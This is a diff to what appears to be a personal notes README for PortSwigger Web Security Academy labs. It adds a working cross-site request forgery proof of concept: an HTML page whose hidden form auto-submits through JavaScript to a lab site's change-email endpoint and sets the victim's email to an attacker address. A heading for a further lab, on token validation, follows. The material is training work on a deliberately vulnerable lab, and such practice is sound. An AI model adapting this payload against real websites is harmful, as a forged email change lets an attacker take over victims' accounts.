@@ -1,4 +1,14 @@
 # Bursuip-
+CSRF vulnerability with no defenses
+
+</html>
+<form  action="https://0a8f00f5041fe6b281d52040007200e1.web-security-academy.net/my-account/change-email" method="post" id="csrf_attack">
+    <input type="hidden" name="email" value="attacker@test.com">
+</form>
+<script>
+        document.getElementById("csrf_attack").submit();
+</script>
+</html>
 
 CSRF where token validation depends on request method
 
